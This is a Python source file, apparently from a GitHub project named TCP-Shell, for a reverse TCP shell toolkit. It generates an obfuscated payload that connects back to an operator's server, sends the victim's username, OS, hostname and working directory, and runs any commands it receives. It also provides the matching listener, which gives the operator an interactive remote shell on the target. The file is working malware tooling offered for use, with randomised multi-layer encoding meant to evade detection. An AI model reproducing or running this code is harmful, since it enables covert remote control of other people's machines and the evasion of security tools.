#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ===================================== #
# Source Code Of TCP-Shell Tool .       #
# Created By : Dr.Linux                 #
# GitHub ID : DrLinuxOfficial           #
#                                       #
# ===================================== #
# ============================================================= #
#                                                               #
# GitHub Link : https://github.com/DrLinuxOfficial/TCP-Shell    #
#                                                               #
# ============================================================= #


import os
import sys
import subprocess
import pip
import platform
import time
import socket
import marshal
import zlib
import base64
import random


class TCPShell:
    def __init__(self):
        try:
            from cryptography.fernet import Fernet
            global Fernet
        except ModuleNotFoundError:
            self.__PackageInstaller__("cryptography")

        try:
            import colorama
        except ModuleNotFoundError:
            self.__PackageInstaller__("colorama")

        if (platform.uname()[0]) == "Windows":
            colorama.init()

        self.__Handler__()

    def __GetLinuxPath__(self, path_data):
        if (path_data.startswith("/home")) == True:
            true_path = "~/"
            path_data = (path_data.split("/"))
            path_data = (path_data[3:])
            true_path += ("/".join([(i) for i in path_data]))
            return true_path
        else:
            return path_data

    def __Writer__(self, data):
        for i in data:
            print(i, end="", flush=True)
            time.sleep(0.01)

    def __Clear__(self):
        if (platform.uname()[0]) == "Linux":
            os.system("clear")
        elif (platform.uname()[0]) == "Windows":
            os.system("cls")

    def __OptionBanner__(self):
        self.__Clear__()
        self.__Writer__("\n\033[32;1m ⎾\033[0;m \033[33;1mReverse\033[0;m \033[31;1mTCP\033[0;m \033[34;1mPayload \033[32;1mGenerator ⏌\033[0;m\n\n\033[35;1m    ╭─────────────────────────╮\n    │\033[0;m  Created \033[36;1mBy\033[0;m : \033[33;1mDr\033[0;m.\033[33;1mLinux\033[0;m\033[35;1m  │  \n    ╰─────────────────────────╯\033[0;m\n\n  \x1b[32;1m⎡\x1b[0;m \x1b[36;1m⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻⎻\x1b[0;m\x1b[32;1m ⎤\n  ⎢\x1b[0;m \x1b[33;1m⌈\x1b[0;m1\x1b[33;1m⌋\x1b[0;m \x1b[32;1mGenerate\x1b[0;m \x1b[36;1mPayload\x1b[0;m\x1b[32;1m        ⎥\n  ⎢                             ⎥\n  ⎢\x1b[0;m \x1b[33;1m⌈\x1b[0;m2\x1b[33;1m⌋\x1b[0;m \x1b[32;1mListening\x1b[0;m To \x1b[36;1mPayload\x1b[0;m    \x1b[32;1m⎥\n  ⎢                             ⎥\n  ⎢ \x1b[33;1m⌈\x1b[0;m3\x1b[33;1m⌋\x1b[0;m \x1b[32;1mGenerate\x1b[0;m \x1b[34;1mSocket\x1b[0;m \x1b[33;1mKey\x1b[0;m     \x1b[32;1m⎥\n  ⎣\x1b[0;m \x1b[36;1m⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽\x1b[0;m \x1b[32;1m⎦\x1b[0;m\n\n")

    def __Banner__(self):
        self.__Clear__()
        self.__Writer__("""  \033[35;1m________________\033[0;m       \033[32;1m_____ __         ____\033[0;m
 \033[35;1m/_  __/ ____/ __ \\\033[0;m     \033[32;1m/ ___// /_  ___  / / /\033[0;m
  \033[35;1m/ / / /   / /_/ /\033[0;m\033[36;1m_____\033[0;m\033[32;1m\__ \/ __ \/ _ \/ / / 
 \033[35;1m/ / / /___/ ____/\033[0;m\033[36;1m_____\033[0;m\033[32;1m/__/ / / / /  __/ / /  
\033[35;1m/_/  \____/_/\033[0;m         \033[32;1m/____/_/ /_/\___/_/_/\033[0;m\n\n\t\t\t\t\t v\033[33;1m1.0\033[0;m\n\n""")

    def __PackageInstaller__(self, PackageName):
        try:
            pip.main(["install", PackageName])
        except AttributeError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", PackageName])
        os.execl(sys.executable, sys.executable, *sys.argv)

    def __Obfuscator__(self, source_data):
        source_data = compile(source_data, "</>", "exec")
        source_data = marshal.dumps(source_data)
        method_list = []
        for i in range((random.randint(3,8))):
            method = random.choice(["marshal", "zlib", "base85", "base64", "base32", "base16"])
            if method == "marshal":
                source_data = marshal.dumps(source_data)
            elif method == "zlib":
                source_data = zlib.compress(source_data)
            elif method == "base85":
                source_data = base64.b85encode(source_data)
            elif method == "base64":
                source_data = base64.b64encode(source_data)
            elif method == "base32":
                source_data = base64.b32encode(source_data)
            elif method == "base16":
                source_data = base64.b16encode(source_data)
            method_list.append(method)

        obf_code = "(lambda ___,____: ___(____))(exec,((__import__('\\x6d\\x61\\x72\\x73\\x68\\x61\\x6c').loads("

        for i in method_list:
            if i == "marshal":
                obf_code += "(__import__('\\x6d\\x61\\x72\\x73\\x68\\x61\\x6c').loads("
            elif i == "zlib":
                obf_code += "(__import__('\\x7a\\x6c\\x69\\x62').decompress("
            elif ((i.startswith("base"))) == True:
                method = i.replace("base", "")
                obf_code += f"(__import__('\\x62\\x61\\x73\\x65\\x36\\x34').b{method}decode("
        obf_code += (str(source_data))
        for i in method_list:
            obf_code += "))"
        obf_code += "))))"
        return obf_code

    def __PayloadGenerator__(self, server_ip, server_port, key, obf_layer):
        key = (key.replace("0x", ""))
        key = ((base64.b16decode(key)).decode())
        payloda_data = '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# ===================================== #\n# Payload Code Of TCP-Shell Tool .      #\n# Created By : Dr.Linux                 #\n# GitHub ID : DrLinuxOfficial           #\n#                                       #\n# ===================================== #\n# ============================================================= #\n#                                                               #\n# GitHub Link : https://github.com/DrLinuxOfficial/TCP-Shell    #\n#                                                               #\n# ============================================================= #\n\n\nfrom cryptography.fernet import Fernet\nfrom subprocess import getoutput\nfrom getpass import getuser\nimport platform\nimport os\nimport socket\nimport time\n\n\nKEY = b\''+key+'\'\n\n\nconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n\nwhile True:\n    try:\n        connection.connect((\n                            "'+server_ip+'",\n                             '+server_port+'\n                          ))\n    except Exception:\n        time.sleep(3)\n    else:\n        connection.send((Fernet(KEY).encrypt((f"{getuser()}|{platform.uname()[0]}|{platform.uname()[1]}|{platform.uname()[4]}|{os.getcwd()}").encode())))\n        break\n\n\nwhile True:\n    server_result = connection.recv(1000000000)\n    server_result = (Fernet(KEY).decrypt(server_result)).decode()\n    if server_result[0:2] == "cd":\n        try:\n            os.chdir(server_result[3:])\n        except Exception:\n            shell_result = "bash: cd: {}: No such file or directory".format(server_result[3:])\n            shell_result = (Fernet(KEY).encrypt((shell_result).encode()))\n        else:\n            shell_result = (Fernet(KEY).encrypt(b""))\n    else:\n        shell_result = getoutput(server_result)\n        shell_result = (Fernet(KEY).encrypt((shell_result).encode()))\n    connection.send(shell_result)\n    connection.send((Fernet(KEY).encrypt(((os.getcwd()).encode()))))\n\n'
        for i in range(obf_layer):
            payloda_data = (self.__Obfuscator__(payloda_data))
        return payloda_data

    def __Handler__(self):
        self.__OptionBanner__()
        try:
            user_option = int(input("  \033[35;1m(\033[0;m\033[31;1mTCP\033[0;m\033[34;1m-\033[0;m\033[32;1mShell\033[0;m\033[35;1m)\033[0;m-\033[33;1m>>>\033[0;m "))
        except ValueError:
            print("\nPlease Enter \033[34;1mInteger\033[0;m Number !!!\n")
            time.sleep(4)
            self.__Handler__()
        else:
            if user_option in [1,2,3]:
                if user_option == 1:
                    socket_key = input("\n\n  Enter The \033[34;1mSocket\033[0;m \033[32;1mKey\033[0;m \033[36;1m==\033[0;m> ")
                    server_ip = input("  \033[33;1mServer\033[0;m \033[34;1mIP\033[0;m \033[36;1m==\033[0;m> ")
                    server_port = input("  \033[33;1mServer\033[0;m \033[34;1mPORT\033[0;m \033[36;1m==\033[0;m> ")
                    try:
                        int(server_port)
                    except ValueError:
                        print("\nPlease Enter \033[34;1mInteger\033[0;m Number !!!\n")
                        time.sleep(4)
                        self.__Handler__()
                    else:
                        try:
                            payload_obf_layer = int(input("  Enter The \033[34;1mPayload\033[0;m \033[32;1mObfuscate\033[0;m \033[33;1mLayer\033[0;m\033[35;1m(\033[0;m1 - 10\033[35;1m)\033[0;m Number \033[36;1m==\033[0;m> "))
                        except ValueError:
                            print("\nPlease Enter \033[34;1mInteger\033[0;m Number !!!\n")
                            time.sleep(4)
                            self.__Handler__()
                        else:
                            if payload_obf_layer <= 10:
                                payload_file = input("  Enter The \033[34;1mPayload\033[0;m \033[33;1mOutput\033[0;m File Name \033[36;1m==\033[0;m> ")
                                payload_obf_data = self.__PayloadGenerator__(server_ip, server_port, socket_key, payload_obf_layer)
                                self.__Writer__("\n\n   \033[32;1m==================================================\033[0;m\n\n")
                                self.__Writer__("     \033[33;1mGenerating\033[0;m \033[34;1mPayload\033[0;m ...\n")
                                self.__Writer__("     \033[32;1mObfuscating\033[0;m \033[33;1mGenerated\033[0;m \033[34;1mPayload\033[0;m ...\n")
                                self.__Writer__(f"     \033[34;1mPayload\033[0;m \033[32;1mPython\033[0;m Version : \033[33;1m{platform.python_version()}\033[0;m\n")
                                self.__Writer__(f"     \033[33;1mGenerated\033[0;m \033[34;1mPayload\033[0;m Length : \033[32;1m{(len(payload_obf_data))}\033[0;m\n")
                                with open(payload_file, "w") as f:
                                    f.write(payload_obf_data)
                                self.__Writer__(f"\n     \033[34;1mPayload\033[0;m \033[32;1mSaved\033[0;m \033[31;1mas\033[0;m \033[33;1m{payload_file}\033[0;m !!!\n\n")
                            else:
                                print("\n\033[34;1mPayload\033[0;m \033[32;1mObfuscate\033[0;m \033[33;1mLayer\033[0;m Must Be \033[31;1mBetween\033[0;m \033[33;1m1\033[0;m and \033[33;1m10\033[0;m !!!\n")
                                time.sleep(4)
                                self.__Handler__()

                elif user_option == 2:
                    server_ip = input("\n\n  Enter The \033[32;1mListening\033[0;m \033[34;1mIP\033[0;m \033[36;1m==\033[0;m> ")
                    server_port = input("  Enter The \033[32;1mListening\033[0;m \033[34;1mPORT\033[0;m \033[36;1m==\033[0;m> ")
                    try:
                        server_port = (int(server_port))
                    except ValueError:
                        print("\nPlease Enter \033[34;1mInteger\033[0;m Number !!!\n")
                        time.sleep(4)
                        self.__Handler__()
                    else:
                        socket_key = input("  Enter The \033[34;1mSocket\033[0;m \033[32;1mKey\033[0;m \033[36;1m==\033[0;m> ")
                        socket_key = (socket_key.replace("0x", "")).encode()
                        socket_key = (base64.b16decode(socket_key))
                        server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        try:
                            server_connection.bind((
                                                    server_ip,
                                                    server_port
                                                  ))
                        except Exception:
                            print("\nCannot \033[32;1mListening\033[0;m On \033[33;1m{server_ip}\033[0;m\033[33;1m{server_port}\033[0;m !!!\n")
                            time.sleep(4)
                            self.__Handler__()
                        else:
                            server_connection.listen(1)
                            client, client_info = server_connection.accept()
                            client_session_data = client.recv(1000000000)
                            client_session_data = ((Fernet(socket_key).decrypt(client_session_data)).decode())
                            client_session_data = (client_session_data.split("|"))
                            self.__Banner__()
                            self.__Writer__(f"\n   \033[33;1mInformation\033[0;m Of \033[32;1mTarget\033[0;m :\n\n\t\033[31;1mIP\033[0;m : {(client_info[0])}\n\t\033[33;1mPlatform\033[0;m : {(client_session_data[1])}\n\t\033[32;1mOS\033[0;m : {(client_session_data[2])}\n\t\033[36;1mUsername\033[0;m : {(client_session_data[0])}\n\t\033[30;1mMachine\033[0;m : {(client_session_data[3])}\n\n")
                            if client_session_data[1] == "Linux":
                                prompt_data = ("\033[32;1m" + client_session_data[0] + "@" + client_session_data[2] + "\033[0;m:\033[34;1m{}\033[0;m\033[31;1m#\033[0;m ")
                                shell_path = (self.__GetLinuxPath__((client_session_data[4])))
                            elif client_session_data[1] == "Windows":
                                prompt_data = ("{} > ")
                                shell_path = client_session_data[4]

                            while True:
                                command = (input(prompt_data.format(shell_path)))
                                if command in ["clear", "cls"]:
                                    self.__Clear__()
                                else:
                                    client.send(((Fernet(socket_key).encrypt((command.encode())))))
                                    shell_result = client.recv(1000000000)
                                    shell_result = ((Fernet(socket_key).decrypt(shell_result))).decode()
                                    shell_path = client.recv(1000000000)
                                    shell_path = ((Fernet(socket_key).decrypt(shell_path))).decode()
                                    if client_session_data[1] == "Linux":
                                        shell_path = (self.__GetLinuxPath__(shell_path))
                                    print(shell_result)

                elif user_option == 3:
                    self.__Writer__("\n\n   \033[33;1mGenerating\033[0;m \033[32;1mKey\033[0;m ...")
                    new_key = Fernet.generate_key()
                    new_key = base64.b16encode(new_key)
                    new_key = "0x" + (new_key.decode())
                    self.__Writer__(f"\n   \033[32;1mKey\033[0;m \033[36;1m==\033[0;m> \033[30;1m{new_key}\033[0;m\n\n")
            else:
                print("\nPlease Select \033[32;1mTrue\033[0;m Option !!!\n")
                time.sleep(4)
                self.__Handler__()



try:
    TCPShell()
except KeyboardInterrupt:
    print("\n\n\033[31;1mExit\033[0;m !!!\n")

